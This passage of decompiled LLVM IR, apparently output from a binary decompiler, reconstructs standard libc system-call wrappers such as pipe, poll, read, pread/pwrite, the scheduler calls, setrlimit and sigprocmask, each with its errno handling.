  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_104d0 = load i32, i32* @r4, align 4
  store i32 %v3_104d0, i32* %stack_var_-8, align 4
  %v0_104d4 = call i32 @pause()
  store i32 %v0_104d4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_104d4, -4095
  br i1 %tmp, label %dec_label_pc_104f4, label %dec_label_pc_104e4

dec_label_pc_104e4:                               ; preds = %entry
  %v0_104e4 = call i32 @__errno_location()
  %v0_104e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_104e8 = sub i32 0, %v0_104e8
  %v2_104ec = inttoptr i32 %v0_104e4 to i32*
  store i32 %v1_104e8, i32* %v2_104ec, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_104f4

dec_label_pc_104f4:                               ; preds = %entry, %dec_label_pc_104e4
  %v0_104f4 = phi i32 [ %v0_104d4, %entry ], [ -1, %dec_label_pc_104e4 ]
  %v2_104f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_104f8, i32* %r4.global-to-local, align 4
  ret i32 %v0_104f4

; uselistorder directives
  uselistorder i32 %v0_104d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_104f4, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_104fc = load i32, i32* @r4, align 4
  store i32 %v3_104fc, i32* %stack_var_-8, align 4
  %v1_10500 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_10500 = call i32 @pipe([2 x i32] %v1_10500)
  store i32 %v2_10500, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_10500, -4095
  br i1 %tmp, label %dec_label_pc_10520, label %dec_label_pc_10510

dec_label_pc_10510:                               ; preds = %entry
  %v0_10510 = call i32 @__errno_location()
  %v0_10514 = load i32, i32* %r4.global-to-local, align 4
  %v1_10514 = sub i32 0, %v0_10514
  %v2_10518 = inttoptr i32 %v0_10510 to i32*
  store i32 %v1_10514, i32* %v2_10518, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10520

dec_label_pc_10520:                               ; preds = %entry, %dec_label_pc_10510
  %v0_10520 = phi i32 [ %v2_10500, %entry ], [ -1, %dec_label_pc_10510 ]
  %v2_10524 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10524, i32* %r4.global-to-local, align 4
  ret i32 %v0_10520

; uselistorder directives
  uselistorder i32 %v2_10500, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10520, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10528 = load i32, i32* @r4, align 4
  store i32 %v3_10528, i32* %stack_var_-8, align 4
  %v5_1052c = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_1052c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_1052c, -4095
  br i1 %tmp, label %dec_label_pc_1054c, label %dec_label_pc_1053c

dec_label_pc_1053c:                               ; preds = %entry
  %v0_1053c = call i32 @__errno_location()
  %v0_10540 = load i32, i32* %r4.global-to-local, align 4
  %v1_10540 = sub i32 0, %v0_10540
  %v2_10544 = inttoptr i32 %v0_1053c to i32*
  store i32 %v1_10540, i32* %v2_10544, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1054c

dec_label_pc_1054c:                               ; preds = %entry, %dec_label_pc_1053c
  %v0_1054c = phi i32 [ %v5_1052c, %entry ], [ -1, %dec_label_pc_1053c ]
  %v2_10550 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10550, i32* @r4, align 4
  ret i32 %v0_1054c

; uselistorder directives
  uselistorder i32 %v5_1052c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1054c, { 1, 0 }
}

define i32 @__fake_pread_write64() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %v0_1055c = load i32, i32* @r1, align 4
  store i32 %v0_1055c, i32* @r6, align 4
  %v0_10560 = load i32, i32* @r3, align 4
  %v0_10564 = load i32, i32* @r2, align 4
  store i32 %v0_10564, i32* %r7.global-to-local, align 4
  %v0_10574 = load i32, i32* @r0, align 4
  store i32 %v0_10574, i32* %r8.global-to-local, align 4
  %v4_10578 = call i32 @__libc_lseek64(i32 %v0_10574, i32 0, i32 0, i32 1)
  %v3_1057c = icmp eq i32 %v4_10578, -1
  store i32 %v4_10578, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br i1 %v3_1057c, label %dec_label_pc_1058c, label %dec_label_pc_10594

dec_label_pc_1058c:                               ; preds = %entry
  br label %dec_label_pc_10594

dec_label_pc_10594:                               ; preds = %dec_label_pc_1058c, %entry
  %v0_1059c = load i32, i32* %r8.global-to-local, align 4
  %v4_105a4 = call i32 @__libc_lseek64(i32 %v0_1059c, i32 %v0_10560, i32 %tmp7, i32 0)
  %v3_105a8 = icmp eq i32 %v4_105a4, -1
  br i1 %v3_105a8, label %dec_label_pc_105b0, label %dec_label_pc_105b8

dec_label_pc_105b0:                               ; preds = %dec_label_pc_10594
  %v7_105b0 = icmp eq i32 %v0_10560, -1
  br i1 %v7_105b0, label %dec_label_pc_1062c, label %dec_label_pc_105b8

dec_label_pc_105b8:                               ; preds = %dec_label_pc_10594, %dec_label_pc_105b0
  %v7_105bc = icmp eq i32 %tmp, 1
  %v0_105c4 = load i32, i32* @r6, align 4
  store i32 %v0_105c4, i32* @r1, align 4
  %v0_105c8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_105c8, i32* @r2, align 4
  %v0_105cc = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_105cc, i32* @r0, align 4
  br i1 %v7_105bc, label %dec_label_pc_105c4, label %dec_label_pc_105d8

dec_label_pc_105c4:                               ; preds = %dec_label_pc_105b8
  %v2_105d0 = call i32 @__libc_write(i32 %v0_105cc, i32 %v0_105c4)
  br label %dec_label_pc_105e8

dec_label_pc_105d8:                               ; preds = %dec_label_pc_105b8
  %v1_105e4 = call i32 @__libc_read(i32 %v0_105cc)
  br label %dec_label_pc_105e8

dec_label_pc_105e8:                               ; preds = %dec_label_pc_105c4, %dec_label_pc_105d8
  %storemerge = phi i32 [ %v1_105e4, %dec_label_pc_105d8 ], [ %v2_105d0, %dec_label_pc_105c4 ]
  store i32 %storemerge, i32* %r7.global-to-local, align 4
  %v0_105ec = call i32 @__errno_location()
  %v0_105f0 = load i32, i32* @r4, align 4
  store i32 %v0_105ec, i32* @r6, align 4
  %v0_105f8 = load i32, i32* @r5, align 4
  %v0_105fc = load i32, i32* %r8.global-to-local, align 4
  %v1_10604 = inttoptr i32 %v0_105ec to i32*
  %v2_10604 = load i32, i32* %v1_10604, align 4
  store i32 %v2_10604, i32* @r4, align 4
  %v4_10608 = call i32 @__libc_lseek64(i32 %v0_105fc, i32 %v0_105f0, i32 %v0_105f8, i32 0)
  %v3_1060c = icmp eq i32 %v4_10608, -1
  br i1 %v3_1060c, label %dec_label_pc_10614, label %dec_label_pc_10624

dec_label_pc_10614:                               ; preds = %dec_label_pc_105e8
  %v3_10614 = icmp eq i32 %v0_105f0, -1
  br i1 %v3_10614, label %dec_label_pc_1061c, label %dec_label_pc_10624

dec_label_pc_1061c:                               ; preds = %dec_label_pc_10614
  %v0_1061c = load i32, i32* %r7.global-to-local, align 4
  %v3_1061c = icmp eq i32 %v0_1061c, -1
  br i1 %v3_1061c, label %dec_label_pc_10624, label %dec_label_pc_1062c

dec_label_pc_10624:                               ; preds = %dec_label_pc_1061c, %dec_label_pc_10614, %dec_label_pc_105e8
  %v0_10624 = load i32, i32* @r4, align 4
  %v1_10624 = load i32, i32* @r6, align 4
  %v2_10624 = inttoptr i32 %v1_10624 to i32*
  store i32 %v0_10624, i32* %v2_10624, align 4
  %v0_10630.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10630

dec_label_pc_1062c:                               ; preds = %dec_label_pc_1061c, %dec_label_pc_105b0
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10630

dec_label_pc_10630:                               ; preds = %dec_label_pc_10624, %dec_label_pc_1062c
  %v0_10630 = phi i32 [ %v0_10630.pre, %dec_label_pc_10624 ], [ -1, %dec_label_pc_1062c ]
  ret i32 %v0_10630

; uselistorder directives
  uselistorder label %dec_label_pc_10630, { 1, 0 }
  uselistorder label %dec_label_pc_105e8, { 1, 0 }
  uselistorder label %dec_label_pc_105b8, { 1, 0 }
}

define i32 @__libc_pwrite64(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10664 = call i32 @__fake_pread_write64()
  ret i32 %v0_10664

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1069c = call i32 @__fake_pread_write64()
  ret i32 %v0_1069c

; uselistorder directives
  uselistorder i32 ()* @__fake_pread_write64, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__fake_pread_write() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_106b4 = load i32, i32* @r1, align 4
  store i32 %v0_106b4, i32* @r5, align 4
  %v0_106b8 = load i32, i32* @r2, align 4
  store i32 %v0_106b8, i32* %r7.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v0_106c4 = load i32, i32* @r3, align 4
  store i32 %v0_106c4, i32* @r4, align 4
  %v0_106c8 = load i32, i32* @r0, align 4
  store i32 %v0_106c8, i32* @r6, align 4
  %v3_106cc = call i32 @__GI___libc_lseek(i32 %v0_106c8, i32 0, i32 1)
  %v7_106d0 = icmp eq i32 %v3_106cc, -1
  store i32 %v3_106cc, i32* %r8.global-to-local, align 4
  br i1 %v7_106d0, label %dec_label_pc_1075c, label %dec_label_pc_106dc

dec_label_pc_106dc:                               ; preds = %entry
  %v0_106dc = load i32, i32* @r4, align 4
  store i32 %v0_106dc, i32* @r1, align 4
  %v0_106e0 = load i32, i32* @r6, align 4
  store i32 %v0_106e0, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v3_106e8 = call i32 @__GI___libc_lseek(i32 %v0_106e0, i32 %v0_106dc, i32 0)
  %v7_106ec = icmp eq i32 %v3_106e8, -1
  br i1 %v7_106ec, label %dec_label_pc_1075c, label %dec_label_pc_106f4

dec_label_pc_106f4:                               ; preds = %dec_label_pc_106dc
  %v3_106f4 = load i32, i32* %stack_var_0, align 4
  %v7_106f8 = icmp eq i32 %v3_106f4, 1
  %v0_10700 = load i32, i32* @r5, align 4
  store i32 %v0_10700, i32* @r1, align 4
  %v0_10704 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10704, i32* @r2, align 4
  %v0_10708 = load i32, i32* @r6, align 4
  store i32 %v0_10708, i32* @r0, align 4
  br i1 %v7_106f8, label %dec_label_pc_10700, label %dec_label_pc_10714

dec_label_pc_10700:                               ; preds = %dec_label_pc_106f4
  %v2_1070c = call i32 @__libc_write(i32 %v0_10708, i32 %v0_10700)
  br label %dec_label_pc_10724

dec_label_pc_10714:                               ; preds = %dec_label_pc_106f4
  %v1_10720 = call i32 @__libc_read(i32 %v0_10708)
  br label %dec_label_pc_10724

dec_label_pc_10724:                               ; preds = %dec_label_pc_10700, %dec_label_pc_10714
  %storemerge = phi i32 [ %v1_10720, %dec_label_pc_10714 ], [ %v2_1070c, %dec_label_pc_10700 ]
  store i32 %storemerge, i32* @r5, align 4
  %v0_10728 = call i32 @__errno_location()
  %v0_1072c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1072c, i32* @r1, align 4
  store i32 %v0_10728, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v0_10738 = load i32, i32* @r6, align 4
  store i32 %v0_10738, i32* @r0, align 4
  %v1_1073c = inttoptr i32 %v0_10728 to i32*
  %v2_1073c = load i32, i32* %v1_1073c, align 4
  store i32 %v2_1073c, i32* @r6, align 4
  %v3_10740 = call i32 @__GI___libc_lseek(i32 %v0_10738, i32 %v0_1072c, i32 0)
  %v3_10744 = icmp eq i32 %v3_10740, -1
  br i1 %v3_10744, label %dec_label_pc_1074c, label %dec_label_pc_10754

dec_label_pc_1074c:                               ; preds = %dec_label_pc_10724
  %v0_1074c = load i32, i32* @r5, align 4
  %v3_1074c = icmp eq i32 %v0_1074c, -1
  br i1 %v3_1074c, label %dec_label_pc_10754, label %dec_label_pc_1075c

dec_label_pc_10754:                               ; preds = %dec_label_pc_1074c, %dec_label_pc_10724
  %v0_10754 = load i32, i32* @r6, align 4
  %v1_10754 = load i32, i32* @r4, align 4
  %v2_10754 = inttoptr i32 %v1_10754 to i32*
  store i32 %v0_10754, i32* %v2_10754, align 4
  %v0_10760.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10760

dec_label_pc_1075c:                               ; preds = %dec_label_pc_1074c, %dec_label_pc_106dc, %entry
  br label %dec_label_pc_10760

dec_label_pc_10760:                               ; preds = %dec_label_pc_10754, %dec_label_pc_1075c
  %v0_10760 = phi i32 [ %v0_10760.pre, %dec_label_pc_10754 ], [ -1, %dec_label_pc_1075c ]
  ret i32 %v0_10760

; uselistorder directives
  uselistorder i32 %v3_106cc, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI___libc_lseek, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10760, { 1, 0 }
  uselistorder label %dec_label_pc_10724, { 1, 0 }
}

define i32 @__libc_pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_10778 = call i32 @__fake_pread_write()
  ret i32 %v0_10778
}

define i32 @__libc_pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_10794 = call i32 @__fake_pread_write()
  ret i32 %v0_10794

; uselistorder directives
  uselistorder i32 ()* @__fake_pread_write, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_107a0 = load i32, i32* @r4, align 4
  store i32 %v3_107a0, i32* %stack_var_-8, align 4
  %v0_107a4 = call i32 @read()
  store i32 %v0_107a4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_107a4, -4095
  br i1 %tmp, label %dec_label_pc_107c4, label %dec_label_pc_107b4

dec_label_pc_107b4:                               ; preds = %entry
  %v0_107b4 = call i32 @__errno_location()
  %v0_107b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_107b8 = sub i32 0, %v0_107b8
  %v2_107bc = inttoptr i32 %v0_107b4 to i32*
  store i32 %v1_107b8, i32* %v2_107bc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_107c4

dec_label_pc_107c4:                               ; preds = %entry, %dec_label_pc_107b4
  %v0_107c4 = phi i32 [ %v0_107a4, %entry ], [ -1, %dec_label_pc_107b4 ]
  %v2_107c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_107c8, i32* @r4, align 4
  ret i32 %v0_107c4

; uselistorder directives
  uselistorder i32 %v0_107a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_107c4, { 1, 0 }
}

define i32 @sched_get_priority_max() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_107cc = load i32, i32* @r4, align 4
  store i32 %v3_107cc, i32* %stack_var_-8, align 4
  %v0_107d0 = call i32 @sched_get_priority_max()
  store i32 %v0_107d0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_107d0, -4095
  br i1 %tmp, label %dec_label_pc_107f0, label %dec_label_pc_107e0

dec_label_pc_107e0:                               ; preds = %entry
  %v0_107e0 = call i32 @__errno_location()
  %v0_107e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_107e4 = sub i32 0, %v0_107e4
  %v2_107e8 = inttoptr i32 %v0_107e0 to i32*
  store i32 %v1_107e4, i32* %v2_107e8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_107f0

dec_label_pc_107f0:                               ; preds = %entry, %dec_label_pc_107e0
  %v0_107f0 = phi i32 [ %v0_107d0, %entry ], [ -1, %dec_label_pc_107e0 ]
  %v2_107f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_107f4, i32* @r4, align 4
  ret i32 %v0_107f0

; uselistorder directives
  uselistorder i32 %v0_107d0, { 1, 0, 2 }
  uselistorder i32 ()* @sched_get_priority_max, { 2, 1, 0 }
  uselistorder label %dec_label_pc_107f0, { 1, 0 }
}

define i32 @sched_get_priority_min() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_107f8 = load i32, i32* @r4, align 4
  store i32 %v3_107f8, i32* %stack_var_-8, align 4
  %v0_107fc = call i32 @sched_get_priority_min()
  store i32 %v0_107fc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_107fc, -4095
  br i1 %tmp, label %dec_label_pc_1081c, label %dec_label_pc_1080c

dec_label_pc_1080c:                               ; preds = %entry
  %v0_1080c = call i32 @__errno_location()
  %v0_10810 = load i32, i32* %r4.global-to-local, align 4
  %v1_10810 = sub i32 0, %v0_10810
  %v2_10814 = inttoptr i32 %v0_1080c to i32*
  store i32 %v1_10810, i32* %v2_10814, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1081c

dec_label_pc_1081c:                               ; preds = %entry, %dec_label_pc_1080c
  %v0_1081c = phi i32 [ %v0_107fc, %entry ], [ -1, %dec_label_pc_1080c ]
  %v2_10820 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10820, i32* @r4, align 4
  ret i32 %v0_1081c

; uselistorder directives
  uselistorder i32 %v0_107fc, { 1, 0, 2 }
  uselistorder i32 ()* @sched_get_priority_min, { 1, 0 }
  uselistorder label %dec_label_pc_1081c, { 1, 0 }
}

define i32 @sched_getparam() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10824 = load i32, i32* @r4, align 4
  store i32 %v3_10824, i32* %stack_var_-8, align 4
  %v0_10828 = call i32 @sched_getparam()
  store i32 %v0_10828, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10828, -4095
  br i1 %tmp, label %dec_label_pc_10848, label %dec_label_pc_10838

dec_label_pc_10838:                               ; preds = %entry
  %v0_10838 = call i32 @__errno_location()
  %v0_1083c = load i32, i32* %r4.global-to-local, align 4
  %v1_1083c = sub i32 0, %v0_1083c
  %v2_10840 = inttoptr i32 %v0_10838 to i32*
  store i32 %v1_1083c, i32* %v2_10840, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10848

dec_label_pc_10848:                               ; preds = %entry, %dec_label_pc_10838
  %v0_10848 = phi i32 [ %v0_10828, %entry ], [ -1, %dec_label_pc_10838 ]
  %v2_1084c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1084c, i32* @r4, align 4
  ret i32 %v0_10848

; uselistorder directives
  uselistorder i32 %v0_10828, { 1, 0, 2 }
  uselistorder i32 ()* @sched_getparam, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10848, { 1, 0 }
}

define i32 @sched_getscheduler() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10850 = load i32, i32* @r4, align 4
  store i32 %v3_10850, i32* %stack_var_-8, align 4
  %v0_10854 = call i32 @sched_getscheduler()
  store i32 %v0_10854, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10854, -4095
  br i1 %tmp, label %dec_label_pc_10874, label %dec_label_pc_10864

dec_label_pc_10864:                               ; preds = %entry
  %v0_10864 = call i32 @__errno_location()
  %v0_10868 = load i32, i32* %r4.global-to-local, align 4
  %v1_10868 = sub i32 0, %v0_10868
  %v2_1086c = inttoptr i32 %v0_10864 to i32*
  store i32 %v1_10868, i32* %v2_1086c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10874

dec_label_pc_10874:                               ; preds = %entry, %dec_label_pc_10864
  %v0_10874 = phi i32 [ %v0_10854, %entry ], [ -1, %dec_label_pc_10864 ]
  %v2_10878 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10878, i32* @r4, align 4
  ret i32 %v0_10874

; uselistorder directives
  uselistorder i32 %v0_10854, { 1, 0, 2 }
  uselistorder i32 ()* @sched_getscheduler, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10874, { 1, 0 }
}

define i32 @sched_setscheduler() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1087c = load i32, i32* @r4, align 4
  store i32 %v3_1087c, i32* %stack_var_-8, align 4
  %v0_10880 = call i32 @sched_setscheduler()
  store i32 %v0_10880, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10880, -4095
  br i1 %tmp, label %dec_label_pc_108a0, label %dec_label_pc_10890

dec_label_pc_10890:                               ; preds = %entry
  %v0_10890 = call i32 @__errno_location()
  %v0_10894 = load i32, i32* %r4.global-to-local, align 4
  %v1_10894 = sub i32 0, %v0_10894
  %v2_10898 = inttoptr i32 %v0_10890 to i32*
  store i32 %v1_10894, i32* %v2_10898, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_108a0

dec_label_pc_108a0:                               ; preds = %entry, %dec_label_pc_10890
  %v0_108a0 = phi i32 [ %v0_10880, %entry ], [ -1, %dec_label_pc_10890 ]
  %v2_108a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_108a4, i32* @r4, align 4
  ret i32 %v0_108a0

; uselistorder directives
  uselistorder i32 %v0_10880, { 1, 0, 2 }
  uselistorder i32 ()* @sched_setscheduler, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_108a0, { 1, 0 }
}

define i32 @sched_yield() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_108a8 = load i32, i32* @r4, align 4
  store i32 %v3_108a8, i32* %stack_var_-8, align 4
  %v0_108ac = call i32 @sched_yield()
  store i32 %v0_108ac, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_108ac, -4095
  br i1 %tmp, label %dec_label_pc_108cc, label %dec_label_pc_108bc

dec_label_pc_108bc:                               ; preds = %entry
  %v0_108bc = call i32 @__errno_location()
  %v0_108c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_108c0 = sub i32 0, %v0_108c0
  %v2_108c4 = inttoptr i32 %v0_108bc to i32*
  store i32 %v1_108c0, i32* %v2_108c4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_108cc

dec_label_pc_108cc:                               ; preds = %entry, %dec_label_pc_108bc
  %v0_108cc = phi i32 [ %v0_108ac, %entry ], [ -1, %dec_label_pc_108bc ]
  %v2_108d0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_108d0, i32* %r4.global-to-local, align 4
  ret i32 %v0_108cc

; uselistorder directives
  uselistorder i32 %v0_108ac, { 1, 0, 2 }
  uselistorder i32 ()* @sched_yield, { 1, 0 }
  uselistorder label %dec_label_pc_108cc, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_108d4 = load i32, i32* @r4, align 4
  store i32 %v3_108d4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_108fc, label %dec_label_pc_108ec

dec_label_pc_108ec:                               ; preds = %entry
  %v0_108ec = call i32 @__errno_location()
  %v0_108f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_108f0 = sub i32 0, %v0_108f0
  %v2_108f4 = inttoptr i32 %v0_108ec to i32*
  store i32 %v1_108f0, i32* %v2_108f4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10900.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_108fc

dec_label_pc_108fc:                               ; preds = %entry, %dec_label_pc_108ec
  %v2_10900 = phi i32 [ %v3_108d4, %entry ], [ %v2_10900.pre, %dec_label_pc_108ec ]
  %v0_108fc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_108ec ]
  store i32 %v2_10900, i32* @r4, align 4
  ret i32 %v0_108fc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_108fc, { 1, 0 }
}

define i32 @__GI_setrlimit(i32 %arg1, %rlimit* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10904 = load i32, i32* @r4, align 4
  store i32 %v3_10904, i32* %stack_var_-8, align 4
  %v4_10908 = call i32 @setrlimit(i32 %arg1, %rlimit* %arg2)
  store i32 %v4_10908, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_10908, -4095
  br i1 %tmp, label %dec_label_pc_10928, label %dec_label_pc_10918

dec_label_pc_10918:                               ; preds = %entry
  %v0_10918 = call i32 @__errno_location()
  %v0_1091c = load i32, i32* %r4.global-to-local, align 4
  %v1_1091c = sub i32 0, %v0_1091c
  %v2_10920 = inttoptr i32 %v0_10918 to i32*
  store i32 %v1_1091c, i32* %v2_10920, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10928

dec_label_pc_10928:                               ; preds = %entry, %dec_label_pc_10918
  %v0_10928 = phi i32 [ %v4_10908, %entry ], [ -1, %dec_label_pc_10918 ]
  %v2_1092c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1092c, i32* %r4.global-to-local, align 4
  ret i32 %v0_10928

; uselistorder directives
  uselistorder i32 %v4_10908, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10928, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10930 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_10930, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_109385 = load i32, i32* @r4, align 4
  store i32 %v3_109385, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10958

bb:                                               ; preds = %entry
  %v3_10938 = load i32, i32* @r4, align 4
  store i32 %v3_10938, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_10958, label %dec_label_pc_10944

dec_label_pc_10944:                               ; preds = %bb
  %v0_10944 = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10950 = inttoptr i32 %v0_10944 to i32*
  store i32 22, i32* %v2_10950, align 4
  %v0_1097c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1097c

dec_label_pc_10958:                               ; preds = %.thread, %bb
  %v7_10958 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_10958, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_10958, -4095
  br i1 %tmp13, label %dec_label_pc_10978, label %dec_label_pc_10968

dec_label_pc_10968:                               ; preds = %dec_label_pc_10958
  %v0_10968 = call i32 @__errno_location()
  %v0_1096c = load i32, i32* %r4.global-to-local, align 4
  %v1_1096c = sub i32 0, %v0_1096c
  %v2_10970 = inttoptr i32 %v0_10968 to i32*
  store i32 %v1_1096c, i32* %v2_10970, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10978

dec_label_pc_10978:                               ; preds = %dec_label_pc_10958, %dec_label_pc_10968
  %v0_10978 = phi i32 [ %v7_10958, %dec_label_pc_10958 ], [ -1, %dec_label_pc_10968 ]
  store i32 %v0_10978, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1097c

dec_label_pc_1097c:                               ; preds = %dec_label_pc_10944, %dec_label_pc_10978
  %v0_1097c = phi i32 [ %v0_1097c.pre, %dec_label_pc_10944 ], [ %v0_10978, %dec_label_pc_10978 ]
  %v2_10980 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10980, i32* @r4, align 4
  ret i32 %v0_1097c

; uselistorder directives
  uselistorder i32 %v7_10958, { 1, 0, 2 }
